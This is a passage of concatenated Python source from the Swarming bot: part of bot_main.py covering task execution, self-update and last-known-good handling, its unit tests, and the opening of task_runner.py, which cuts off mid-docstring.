      update_lkgbc(botobj)
    # TODO(maruel): Handle the case where quit_bit.is_set() happens here. This
    # is concerning as this means a signal (often SIGTERM) was received while
    # running the task. Make sure the host is properly restarting.
  elif cmd == 'update':
    update_bot(botobj, resp['version'])
  elif cmd == 'restart':
    if _in_load_test_mode():
      logging.warning('Would have restarted: %s' % resp['message'])
    else:
      botobj.restart(resp['message'])
  else:
    raise ValueError('Unexpected command: %s\n%s' % (cmd, resp))

  return True


def run_manifest(botobj, manifest, start):
  """"""Defers to task_runner.py.

  Return True if the task succeeded.
  """"""
  # Ensure the manifest is valid. This can throw a json decoding error. Also
  # raise if it is empty.
  if not manifest:
    raise ValueError('Empty manifest')

  # Necessary to signal an internal_failure. This occurs when task_runner fails
  # to execute the command. It is important to note that this data is extracted
  # before any I/O is done, like writting the manifest to disk.
  task_id = manifest['task_id']
  hard_timeout = manifest['hard_timeout'] or None
  # Default the grace period to 30s here, this doesn't affect the grace period
  # for the actual task.
  grace_period = manifest['grace_period'] or 30
  if manifest['hard_timeout']:
    # One for the child process, one for run_isolated, one for task_runner.
    hard_timeout += 3 * manifest['grace_period']
    # For isolated task, download time is not counted for hard timeout so add
    # more time.
    if not manifest['command']:
      hard_timeout += manifest['io_timeout'] or 600

  url = manifest.get('host', botobj.server)
  task_dimensions = manifest['dimensions']
  task_result = {}

  failure = False
  internal_failure = False
  msg = None
  work_dir = os.path.join(botobj.base_dir, 'work')
  try:
    try:
      if os.path.isdir(work_dir):
        file_path.rmtree(work_dir)
    except OSError:
      # If a previous task created an undeleteable file/directory inside 'work',
      # make sure that following tasks are not affected. This is done by working
      # around the undeleteable directory by creating a temporary directory
      # instead. This is not normal behavior. The bot will report a failure on
      # start.
      work_dir = tempfile.mkdtemp(dir=botobj.base_dir, prefix='work')
    else:
      os.makedirs(work_dir)

    env = os.environ.copy()
    # Windows in particular does not tolerate unicode strings in environment
    # variables.
    env['SWARMING_TASK_ID'] = task_id.encode('ascii')

    task_in_file = os.path.join(work_dir, 'task_runner_in.json')
    with open(task_in_file, 'wb') as f:
      f.write(json.dumps(manifest))
    call_hook(botobj, 'on_before_task')
    task_result_file = os.path.join(work_dir, 'task_runner_out.json')
    if os.path.exists(task_result_file):
      os.remove(task_result_file)
    command = [
      sys.executable, THIS_FILE, 'task_runner',
      '--swarming-server', url,
      '--in-file', task_in_file,
      '--out-file', task_result_file,
      '--cost-usd-hour', str(botobj.state.get('cost_usd_hour') or 0.),
      # Include the time taken to poll the task in the cost.
      '--start', str(start),
      '--min-free-space', str(get_min_free_space()),
    ]
    logging.debug('Running command: %s', command)
    # Put the output file into the current working directory, which should be
    # the one containing swarming_bot.zip.
    log_path = os.path.join(botobj.base_dir, 'logs', 'task_runner_stdout.log')
    os_utilities.roll_log(log_path)
    os_utilities.trim_rolled_log(log_path)
    with open(log_path, 'a+b') as f:
      proc = subprocess42.Popen(
          command,
          detached=True,
          cwd=botobj.base_dir,
          env=env,
          stdin=subprocess42.PIPE,
          stdout=f,
          stderr=subprocess42.STDOUT,
          close_fds=sys.platform != 'win32')
      try:
        proc.wait(hard_timeout)
      except subprocess42.TimeoutExpired:
        # That's the last ditch effort; as task_runner should have completed a
        # while ago and had enforced the timeout itself (or run_isolated for
        # hard_timeout for isolated task).
        logging.error('Sending SIGTERM to task_runner')
        proc.terminate()
        internal_failure = True
        msg = 'task_runner hung'
        try:
          proc.wait(grace_period)
        except subprocess42.TimeoutExpired:
          logging.error('Sending SIGKILL to task_runner')
          proc.kill()
        proc.wait()
        return False

    logging.info('task_runner exit: %d', proc.returncode)
    if os.path.exists(task_result_file):
      with open(task_result_file, 'rb') as fd:
        task_result = json.load(fd)

    if proc.returncode:
      msg = 'Execution failed: internal error (%d).' % proc.returncode
      internal_failure = True
    elif not task_result:
      logging.warning('task_runner failed to write metadata')
      msg = 'Execution failed: internal error (no metadata).'
      internal_failure = True
    elif task_result[u'must_signal_internal_failure']:
      msg = (
        'Execution failed: %s' % task_result[u'must_signal_internal_failure'])
      internal_failure = True

    failure = bool(task_result.get('exit_code')) if task_result else False
    return not internal_failure and not failure
  except Exception as e:
    # Failures include IOError when writing if the disk is full, OSError if
    # swarming_bot.zip doesn't exist anymore, etc.
    logging.exception('run_manifest failed')
    msg = 'Internal exception occured: %s\n%s' % (
        e, traceback.format_exc()[-2048:])
    internal_failure = True
  finally:
    if internal_failure:
      post_error_task(botobj, msg, task_id)
    call_hook(
        botobj, 'on_after_task', failure, internal_failure, task_dimensions,
        task_result)
    if os.path.isdir(work_dir):
      try:
        file_path.rmtree(work_dir)
      except Exception as e:
        botobj.post_error(
            'Failed to delete work directory %s: %s' % (work_dir, e))


def update_bot(botobj, version):
  """"""Downloads the new version of the bot code and then runs it.

  Use alternating files; first load swarming_bot.1.zip, then swarming_bot.2.zip,
  never touching swarming_bot.zip which was the originally bootstrapped file.

  LKGBC is handled by update_lkgbc().

  Does not return.
  """"""
  # Alternate between .1.zip and .2.zip.
  new_zip = 'swarming_bot.1.zip'
  if os.path.basename(THIS_FILE) == new_zip:
    new_zip = 'swarming_bot.2.zip'
  new_zip = os.path.join(os.path.dirname(THIS_FILE), new_zip)

  # Download as a new file.
  url = botobj.server + '/swarming/api/v1/bot/bot_code/%s' % version
  if not net.url_retrieve(new_zip, url):
    # It can happen when a server is rapidly updated multiple times in a row.
    botobj.post_error(
        'Unable to download %s from %s; first tried version %s' %
        (new_zip, url, version))
    # Poll again, this may work next time. To prevent busy-loop, sleep a little.
    time.sleep(2)
    return

  s = os.stat(new_zip)
  logging.info('Restarting to %s; %d bytes.', new_zip, s.st_size)
  sys.stdout.flush()
  sys.stderr.flush()

  proc = subprocess42.Popen(
     [sys.executable, new_zip, 'is_fine'],
     stdout=subprocess42.PIPE, stderr=subprocess42.STDOUT)
  output, _ = proc.communicate()
  if proc.returncode:
    botobj.post_error(
        'New bot code is bad: proc exit = %s. stdout:\n%s' %
        (proc.returncode, output))
    # Poll again, the server may have better code next time. To prevent
    # busy-loop, sleep a little.
    time.sleep(2)
    return

  # Don't forget to release the singleton before restarting itself.
  SINGLETON.release()

  # Do not call on_bot_shutdown.
  # On OSX, launchd will be unhappy if we quit so the old code bot process has
  # to outlive the new code child process. Launchd really wants the main process
  # to survive, and it'll restart it if it disappears. os.exec*() replaces the
  # process so this is fine.
  ret = common.exec_python([new_zip, 'start_slave', '--survive'])
  if ret in (1073807364, -1073741510):
    # 1073807364 is returned when the process is killed due to shutdown. No need
    # to alert anyone in that case.
    # -1073741510 is returned when rebooting too. This can happen when the
    # parent code was running the old version and gets confused and decided to
    # poll again.
    # In any case, zap out the error code.
    ret = 0
  elif ret:
    botobj.post_error('Bot failed to respawn after update: %s' % ret)
  sys.exit(ret)


def update_lkgbc(botobj):
  """"""Updates the Last Known Good Bot Code if necessary.""""""
  try:
    if not os.path.isfile(THIS_FILE):
      botobj.post_error('Missing file %s for LKGBC' % THIS_FILE)
      return

    golden = os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip')
    if os.path.isfile(golden):
      org = os.stat(golden)
      cur = os.stat(THIS_FILE)
      if org.st_size == org.st_size and org.st_mtime >= cur.st_mtime:
        return

    # Copy the file back.
    shutil.copy(THIS_FILE, golden)
  except Exception as e:
    botobj.post_error('Failed to update LKGBC: %s' % e)


def get_config():
  """"""Returns the data from config.json.""""""
  global _ERROR_HANDLER_WAS_REGISTERED

  with contextlib.closing(zipfile.ZipFile(THIS_FILE, 'r')) as f:
    config = json.load(f.open('config/config.json', 'r'))

  server = config.get('server', '')
  if not _ERROR_HANDLER_WAS_REGISTERED and server:
    on_error.report_on_exception_exit(server)
    _ERROR_HANDLER_WAS_REGISTERED = True
  return config


def main(args):
  # Add SWARMING_HEADLESS into environ so subcommands know that they are running
  # in a headless (non-interactive) mode.
  os.environ['SWARMING_HEADLESS'] = '1'

  # The only reason this is kept is to enable the unit test to use --help to
  # quit the process.
  parser = optparse.OptionParser(description=sys.modules[__name__].__doc__)
  _, args = parser.parse_args(args)

  # Enforces that only one process with a bot in this directory can be run on
  # this host at once.
  if not SINGLETON.acquire():
    if sys.platform == 'darwin':
      msg = (
          'Found a previous bot, %d rebooting as a workaround for '
          'https://crbug.com/569610.') % os.getpid()
      print >> sys.stderr, msg
      os_utilities.restart(msg)
    else:
      print >> sys.stderr, 'Found a previous bot, %d exiting.' % os.getpid()
    return 1

  for t in ('out', 'err'):
    log_path = os.path.join(
        os.path.dirname(THIS_FILE), 'logs', 'bot_std%s.log' % t)
    os_utilities.roll_log(log_path)
    os_utilities.trim_rolled_log(log_path)

  error = None
  if len(args) != 0:
    error = 'Unexpected arguments: %s' % args
  try:
    return run_bot(error)
  finally:
    call_hook(bot.Bot(None, None, None, os.path.dirname(THIS_FILE), None),
              'on_bot_shutdown')
    logging.info('main() returning')
/n/n/nappengine/swarming/swarming_bot/bot_code/bot_main_test.py/n/n#!/usr/bin/env python
# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import json
import logging
import os
import shutil
import sys
import tempfile
import threading
import time
import unittest
import zipfile

import test_env_bot_code
test_env_bot_code.setup_test_env()

# Creates a server mock for functions in net.py.
import net_utils

import bot_main
from api import bot
from api import os_utilities
from depot_tools import fix_encoding
from utils import file_path
from utils import logging_utils
from utils import net
from utils import subprocess42
from utils import zip_package


# Access to a protected member XX of a client class - pylint: disable=W0212


class TestBotMain(net_utils.TestCase):
  maxDiff = 2000

  def setUp(self):
    super(TestBotMain, self).setUp()
    os.environ.pop('SWARMING_LOAD_TEST', None)
    self.root_dir = tempfile.mkdtemp(prefix='bot_main')
    self.old_cwd = os.getcwd()
    os.chdir(self.root_dir)
    # __main__ does it for us.
    os.mkdir('logs')
    self.url = 'https://localhost:1'
    self.attributes = {
      'dimensions': {
        'foo': ['bar'],
        'id': ['localhost'],
        'pool': ['default'],
      },
      'state': {
        'cost_usd_hour': 3600.,
        'sleep_streak': 0,
      },
      'version': '123',
    }
    self.mock(zip_package, 'generate_version', lambda: '123')
    self.bot = bot.Bot(
        self.attributes, 'https://localhost:1', 'version1', self.root_dir,
        self.fail)
    self.mock(self.bot, 'post_error', self.fail)
    self.mock(self.bot, 'restart', self.fail)
    self.mock(subprocess42, 'call', self.fail)
    self.mock(time, 'time', lambda: 100.)
    config_path = os.path.join(
        test_env_bot_code.BOT_DIR, 'config', 'config.json')
    with open(config_path, 'rb') as f:
      config = json.load(f)
    self.mock(bot_main, 'get_config', lambda: config)
    self.mock(
        bot_main, 'THIS_FILE',
        os.path.join(test_env_bot_code.BOT_DIR, 'swarming_bot.zip'))

  def tearDown(self):
    os.environ.pop('SWARMING_BOT_ID', None)
    os.chdir(self.old_cwd)
    file_path.rmtree(self.root_dir)
    super(TestBotMain, self).tearDown()

  def test_get_dimensions(self):
    dimensions = set(bot_main.get_dimensions(None))
    dimensions.discard('hidpi')
    dimensions.discard('zone')  # Only set on GCE bots.
    expected = {'cores', 'cpu', 'gpu', 'id', 'machine_type', 'os', 'pool'}
    self.assertEqual(expected, dimensions)

  def test_get_dimensions_load_test(self):
    os.environ['SWARMING_LOAD_TEST'] = '1'
    self.assertEqual(['id', 'load_test'], sorted(bot_main.get_dimensions(None)))

  def test_generate_version(self):
    self.assertEqual('123', bot_main.generate_version())

  def test_get_state(self):
    self.mock(time, 'time', lambda: 126.0)
    expected = os_utilities.get_state()
    expected['sleep_streak'] = 12
    # During the execution of this test case, the free disk space could have
    # changed.
    for disk in expected['disks'].itervalues():
      self.assertGreater(disk.pop('free_mb'), 1.)
    actual = bot_main.get_state(None, 12)
    for disk in actual['disks'].itervalues():
      self.assertGreater(disk.pop('free_mb'), 1.)
    self.assertGreater(actual.pop('nb_files_in_temp'), 0)
    self.assertGreater(expected.pop('nb_files_in_temp'), 0)
    self.assertGreater(actual.pop('uptime'), 0)
    self.assertGreater(expected.pop('uptime'), 0)
    self.assertEqual(sorted(expected.pop('temp', {})),
                     sorted(actual.pop('temp', {})))
    self.assertEqual(expected, actual)

  def test_setup_bot(self):
    setup_bots = []
    def setup_bot(_bot):
      setup_bots.append(1)
      return False
    from config import bot_config
    self.mock(bot_config, 'setup_bot', setup_bot)
    restarts = []
    post_event = []
    self.mock(
        os_utilities, 'restart', lambda *a, **kw: restarts.append((a, kw)))
    self.mock(
        bot.Bot, 'post_event', lambda *a, **kw: post_event.append((a, kw)))
    self.expected_requests([])
    bot_main.setup_bot(False)
    expected = [
      (('Starting new swarming bot: %s' % bot_main.THIS_FILE,),
        {'timeout': 900}),
    ]
    self.assertEqual(expected, restarts)
    # It is called twice, one as part of setup_bot(False), another as part of
    # on_shutdown_hook().
    self.assertEqual([1, 1], setup_bots)
    expected = [
      'Starting new swarming bot: %s' % bot_main.THIS_FILE,
      'Bot is stuck restarting for: Starting new swarming bot: %s' %
        bot_main.THIS_FILE,
    ]
    self.assertEqual(expected, [i[0][2] for i in post_event])

  def test_post_error_task(self):
    self.mock(time, 'time', lambda: 126.0)
    self.mock(logging, 'error', lambda *_, **_kw: None)
    self.mock(
        bot_main, 'get_config',
        lambda: {'server': self.url, 'server_version': '1'})
    expected_attribs = bot_main.get_attributes(None)
    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/task_error/23',
            {
              'data': {
                'id': expected_attribs['dimensions']['id'][0],
                'message': 'error',
                'task_id': 23,
              },
            },
            {'resp': 1},
          ),
        ])
    botobj = bot_main.get_bot()
    self.assertEqual({'resp': 1}, bot_main.post_error_task(botobj, 'error', 23))

  def test_run_bot(self):
    # Test the run_bot() loop. Does not use self.bot.
    self.mock(time, 'time', lambda: 126.0)
    class Foo(Exception):
      pass

    def poll_server(botobj, _):
      sleep_streak = botobj.state['sleep_streak']
      self.assertEqual(self.url, botobj.server)
      if sleep_streak == 5:
        raise Exception('Jumping out of the loop')
      return False
    self.mock(bot_main, 'poll_server', poll_server)

    def post_error(botobj, e):
      self.assertEqual(self.url, botobj.server)
      lines = e.splitlines()
      self.assertEqual('Jumping out of the loop', lines[0])
      self.assertEqual('Traceback (most recent call last):', lines[1])
      raise Foo('Necessary to get out of the loop')
    self.mock(bot.Bot, 'post_error', post_error)

    self.mock(
        bot_main, 'get_config',
        lambda: {'server': self.url, 'server_version': '1'})
    self.mock(
        bot_main, 'get_dimensions', lambda _: self.attributes['dimensions'])
    self.mock(os_utilities, 'get_state', lambda *_: self.attributes['state'])

    # Method should have ""self"" as first argument - pylint: disable=E0213
    # pylint: disable=unused-argument
    class Popen(object):
      def __init__(
          self2, cmd, detached, cwd, stdout, stderr, stdin, close_fds):
        self2.returncode = None
        expected = [sys.executable, bot_main.THIS_FILE, 'run_isolated']
        self.assertEqual(expected, cmd[:len(expected)])
        self.assertEqual(True, detached)
        self.assertEqual(subprocess42.PIPE, stdout)
        self.assertEqual(subprocess42.STDOUT, stderr)
        self.assertEqual(subprocess42.PIPE, stdin)
        self.assertEqual(sys.platform != 'win32', close_fds)

      def communicate(self2, i):
        self.assertEqual(None, i)
        self2.returncode = 0
        return '', None
    self.mock(subprocess42, 'Popen', Popen)

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/server_ping',
            {}, 'foo', None,
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/handshake',
            {'data': self.attributes},
            {'bot_version': '123', 'server': self.url, 'server_version': 1},
          ),
        ])

    with self.assertRaises(Foo):
      bot_main.run_bot(None)
    self.assertEqual(
        self.attributes['dimensions']['id'][0], os.environ['SWARMING_BOT_ID'])

  def test_poll_server_sleep(self):
    slept = []
    bit = threading.Event()
    self.mock(bit, 'wait', slept.append)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', self.fail)

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {'data': self.attributes},
            {
              'cmd': 'sleep',
              'duration': 1.24,
            },
          ),
        ])
    self.assertFalse(bot_main.poll_server(self.bot, bit))
    self.assertEqual([1.24], slept)

  def test_poll_server_run(self):
    manifest = []
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', lambda *args: manifest.append(args))
    self.mock(bot_main, 'update_bot', self.fail)

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {'data': self.bot._attributes},
            {
              'cmd': 'run',
              'manifest': {'foo': 'bar'},
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))
    expected = [(self.bot, {'foo': 'bar'}, time.time())]
    self.assertEqual(expected, manifest)

  def test_poll_server_update(self):
    update = []
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', lambda *args: update.append(args))

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {'data': self.attributes},
            {
              'cmd': 'update',
              'version': '123',
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))
    self.assertEqual([(self.bot, '123')], update)

  def test_poll_server_restart(self):
    restart = []
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', self.fail)
    self.mock(self.bot, 'restart', lambda *args: restart.append(args))

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {'data': self.attributes},
            {
              'cmd': 'restart',
              'message': 'Please die now',
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))
    self.assertEqual([('Please die now',)], restart)

  def test_poll_server_restart_load_test(self):
    os.environ['SWARMING_LOAD_TEST'] = '1'
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', self.fail)
    self.mock(self.bot, 'restart', self.fail)

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {
              'data': self.attributes,
            },
            {
              'cmd': 'restart',
              'message': 'Please die now',
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))

  def _mock_popen(self, returncode=0, exit_code=0, url='https://localhost:1'):
    result = {
      'exit_code': exit_code,
      'must_signal_internal_failure': None,
      'version': 3,
    }
    # Method should have ""self"" as first argument - pylint: disable=E0213
    class Popen(object):
      def __init__(
          self2, cmd, detached, cwd, env, stdout, stderr, stdin, close_fds):
        self2.returncode = None
        self2._out_file = os.path.join(
            self.root_dir, 'work', 'task_runner_out.json')
        expected = [
          sys.executable, bot_main.THIS_FILE, 'task_runner',
          '--swarming-server', url,
          '--in-file',
          os.path.join(self.root_dir, 'work', 'task_runner_in.json'),
          '--out-file', self2._out_file,
          '--cost-usd-hour', '3600.0', '--start', '100.0',
          '--min-free-space',
          str(int(
            (os_utilities.get_min_free_space(bot_main.THIS_FILE) + 250.) *
            1024 * 1024)),
        ]
        self.assertEqual(expected, cmd)
        self.assertEqual(True, detached)
        self.assertEqual(self.bot.base_dir, cwd)
        self.assertEqual('24', env['SWARMING_TASK_ID'])
        self.assertTrue(stdout)
        self.assertEqual(subprocess42.STDOUT, stderr)
        self.assertEqual(subprocess42.PIPE, stdin)
        self.assertEqual(sys.platform != 'win32', close_fds)

      def wait(self2, timeout=None): # pylint: disable=unused-argument
        self2.returncode = returncode
        with open(self2._out_file, 'wb') as f:
          json.dump(result, f)
        return 0

    self.mock(subprocess42, 'Popen', Popen)
    return result

  def test_run_manifest(self):
    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))
    def call_hook(botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(self.attributes['dimensions'], botobj.dimensions)
        self.assertEqual(False, failure)
        self.assertEqual(False, internal_failure)
        self.assertEqual({'os': 'Amiga', 'pool': 'default'}, dimensions)
        self.assertEqual(result, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    result = self._mock_popen(url='https://localhost:3')

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'os': 'Amiga', 'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'host': 'https://localhost:3',
      'task_id': '24',
    }
    self.assertEqual(self.root_dir, self.bot.base_dir)
    bot_main.run_manifest(self.bot, manifest, time.time())

  def test_run_manifest_task_failure(self):
    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))
    def call_hook(_botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(True, failure)
        self.assertEqual(False, internal_failure)
        self.assertEqual({'pool': 'default'}, dimensions)
        self.assertEqual(result, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    result = self._mock_popen(exit_code=1)

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'io_timeout': 60,
      'task_id': '24',
    }
    bot_main.run_manifest(self.bot, manifest, time.time())

  def test_run_manifest_internal_failure(self):
    posted = []
    self.mock(bot_main, 'post_error_task', lambda *args: posted.append(args))
    def call_hook(_botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(False, failure)
        self.assertEqual(True, internal_failure)
        self.assertEqual({'pool': 'default'}, dimensions)
        self.assertEqual(result, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    result = self._mock_popen(returncode=1)

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'io_timeout': 60,
      'task_id': '24',
    }
    bot_main.run_manifest(self.bot, manifest, time.time())
    expected = [(self.bot, 'Execution failed: internal error (1).', '24')]
    self.assertEqual(expected, posted)

  def test_run_manifest_exception(self):
    posted = []
    def post_error_task(botobj, msg, task_id):
      posted.append((botobj, msg.splitlines()[0], task_id))
    self.mock(bot_main, 'post_error_task', post_error_task)
    def call_hook(_botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(False, failure)
        self.assertEqual(True, internal_failure)
        self.assertEqual({'pool': 'default'}, dimensions)
        self.assertEqual({}, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    def raiseOSError(*_a, **_k):
      raise OSError('Dang')
    self.mock(subprocess42, 'Popen', raiseOSError)

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'task_id': '24',
    }
    bot_main.run_manifest(self.bot, manifest, time.time())
    expected = [(self.bot, 'Internal exception occured: Dang', '24')]
    self.assertEqual(expected, posted)

  def test_update_bot(self):
    # In a real case 'update_bot' never exits and doesn't call 'post_error'.
    # Under the test however forever-blocking calls finish, and post_error is
    # called.
    self.mock(self.bot, 'post_error', lambda *_: None)
    # Mock the file to download in the temporary directory.
    self.mock(
        bot_main, 'THIS_FILE',
        os.path.join(self.root_dir, 'swarming_bot.1.zip'))
    new_zip = os.path.join(self.root_dir, 'swarming_bot.2.zip')
    # This is necessary otherwise zipfile will crash.
    self.mock(time, 'time', lambda: 1400000000)
    def url_retrieve(f, url):
      self.assertEqual(
          'https://localhost:1/swarming/api/v1/bot/bot_code/123', url)
      self.assertEqual(new_zip, f)
      # Create a valid zip that runs properly.
      with zipfile.ZipFile(f, 'w') as z:
        z.writestr('__main__.py', 'print(""hi"")')
      return True
    self.mock(net, 'url_retrieve', url_retrieve)

    calls = []
    def exec_python(args):
      calls.append(args)
      return 23
    self.mock(bot_main.common, 'exec_python', exec_python)

    with self.assertRaises(SystemExit) as e:
      bot_main.update_bot(self.bot, '123')
    self.assertEqual(23, e.exception.code)

    self.assertEqual([[new_zip, 'start_slave', '--survive']], calls)

  def test_main(self):
    def check(x):
      self.assertEqual(logging.WARNING, x)
    self.mock(logging_utils, 'set_console_level', check)

    def run_bot(error):
      self.assertEqual(None, error)
      return 0
    self.mock(bot_main, 'run_bot', run_bot)

    class Singleton(object):
      # pylint: disable=no-self-argument
      def acquire(self2):
        return True
      def release(self2):
        self.fail()
    self.mock(bot_main, 'SINGLETON', Singleton())

    self.assertEqual(0, bot_main.main([]))


if __name__ == '__main__':
  fix_encoding.fix_encoding()
  if '-v' in sys.argv:
    TestBotMain.maxDiff = None
  logging.basicConfig(
      level=logging.DEBUG if '-v' in sys.argv else logging.CRITICAL)
  unittest.main()
/n/n/nappengine/swarming/swarming_bot/bot_code/task_runner.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Runs a Swarming task.

Downloads all the necessary files to run the task, executes the command and
streams results back to the Swarming server.

The process exit code is 0 when the task was executed, even if the task itself
failed. If there's any failure in the setup or teardown, like invalid packet
response, failure to contact the server, etc, a non zero exit code is used. It's
up to the calling process (bot_main.py) to signal that there was an internal
failure and to cancel this task run and ask the server to retry it.
""""""

import base64
import json
import logging
import optparse
import os
import signal
import sys
import time

from utils import net
from utils import on_error
from utils import subprocess42
from utils import zip_package


# Path to this file or the zip containing this file.
THIS_FILE = os.path.abspath(zip_package.get_main_script_path())


# Sends a maximum of 100kb of stdout per task_update packet.
MAX_CHUNK_SIZE = 102400


# Maximum wait between task_update packet when there's no output.
MAX_PACKET_INTERVAL = 30


# Minimum wait between task_update packet when there's output.
MIN_PACKET_INTERNAL = 10


# Current task_runner_out version.
OUT_VERSION = 3


# On Windows, SIGTERM is actually sent as SIGBREAK since there's no real
# SIGTERM.  SIGBREAK is not defined on posix since it's a pure Windows concept.
SIG_BREAK_OR_TERM = (
    signal.SIGBREAK if sys.platform == 'win32' else signal.SIGTERM)


# Used to implement monotonic_time for a clock that never goes backward.
_last_now = 0


def monotonic_time():
  """"""Returns monotonically increasing time.""""""
  global _last_now
  now = time.time()
  if now > _last_now:
    # TODO(maruel): If delta is large, probably worth alerting via ereporter2.
    _last_now = now
  return _last_now


def get_run_isolated():
  """"""Returns the path to itself to run run_isolated.

  Mocked in test to point to the real run_isolated.py script.
  """"""
  return [sys.executable, THIS_FILE, 'run_isolated']


def get_isolated_cmd(
    work_dir, task_details, isolated_result, min_free_space):
  """"""Returns the command to call run_isolated. Mocked in tests.""""""
  bot_dir = os.path.dirname(work_dir)
  if os.path.isfile(isolated_result):
    os.remove(isolated_result)
  cmd = get_run_isolated()
  cmd.extend(
      [
        '--isolated', task_details.inputs_ref['isolated'].encode('utf-8'),
        '--namespace', task_details.inputs_ref['namespace'].encode('utf-8'),
        '-I', task_details.inputs_ref['isolatedserver'].encode('utf-8'),
        '--json', isolated_result,
        '--log-file', os.path.join(bot_dir, 'logs', 'run_isolated.log'),
        '--cache', os.path.join(bot_dir, 'cache'),
        '--root-dir', os.path.join(work_dir, 'isolated'),
      ])
  if min_free_space:
    cmd.extend(('--min-free-space', str(min_free_space)))

  if task_details.hard_timeout:
    cmd.extend(('--hard-timeout', str(task_details.hard_timeout)))
  if task_details.grace_period:
    cmd.extend(('--grace-period', str(task_details.grace_period)))
  if task_details.extra_args:
    cmd.append('--')
    cmd.extend(task_details.extra_args)
  return cmd


class TaskDetails(object):
  def __init__(self, data):
    """"""Loads the raw data.

    It is expected to have at least:
     - bot_id
     - command as a list of str
     - data as a list of urls
     - env as a dict
     - hard_timeout
     - io_timeout
     - task_id
    """"""
    logging.info('TaskDetails(%s)', data)
    if not isinstance(data, dict):
      raise ValueError('Expected dict, got %r' % data)

    # Get all the data first so it fails early if the task details is invalid.
    self.bot_id = data['bot_id']

    # Raw command. Only self.command or self.inputs_ref can be set.
    self.command = data['command'] or []

    # Isolated command. Is a serialized version of task_request.FilesRef.
    self.inputs_ref = data['inputs_ref']
    self.extra_args = data['extra_args']

    self.env = {
      k.encode('utf-8'): v.encode('utf-8') for k, v in data['env'].iteritems()
    }
    self.grace_period = data['grace_period']
    self.hard_timeout = data['hard_timeout']
    self.io_timeout = data['io_timeout']
    self.task_id = data['task_id']


class MustExit(Exception):
  """"""Raised on signal that the process must exit immediately.""""""
  def __init__(self, sig):
    super(MustExit, self).__init__()
    self.signal = sig


def load_and_run(
    in_file, swarming_server, cost_usd_hour, start, out_file, min_free_space):
  """"""Loads the task's metadata and execute it.

  This may throw all sorts of exceptions in case of failure. It's up to the
  caller to trap them. These shall be considered 'internal_failure' instead of
  'failure' from a TaskRunResult standpoint.
  """"""
  # The work directory is guaranteed to exist since it was created by
  # bot_main.py and contains the manifest. Temporary files will be downloaded
  # there. It's bot_main.py that will delete the directory afterward. Tests are
  # not run from there.
  task_result = None
  def handler(sig, _):
    logging.info('Got signal %s', sig)
    raise MustExit(sig)
  work_dir = os.path.dirname(out_file)
  try:
    with subprocess42.set_signal_handler([SIG_BREAK_OR_TERM], handler):
      if not os.path.isdir(work_dir):
        raise ValueError('%s expected to exist' % work_dir)

      with open(in_file, 'rb') as f:
        task_details = TaskDetails(json.load(f))

      task_result = run_command(
          swarming_server, task_details, work_dir, cost_usd_hour, start,
          min_free_space)
  except MustExit as e:
    # This normally means run_command() didn't get the chance to run, as it
    # itself trap MustExit and will report accordingly. In this case, we want
    # the parent process to send the message instead.
    if not task_result:
      task_result = {
        u'exit_code': None,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure':
            u'task_runner received signal %s' % e.signal,
        u'version': OUT_VERSION,
      }
  finally:
    # We've found tests to delete 'work' when quitting, causing an exception
    # here. Try to recreate the directory if necessary.
    if not os.path.isdir(work_dir):
      os.mkdir(work_dir)
    with open(out_file, 'wb') as f:
      json.dump(task_result, f)


def post_update(swarming_server, params, exit_code, stdout, output_chunk_start):
  """"""Posts task update to task_update.

  Arguments:
    swarming_server: Base URL to Swarming server.
    params: Default JSON parameters for the POST.
    exit_code: Process exit code, only when a command completed.
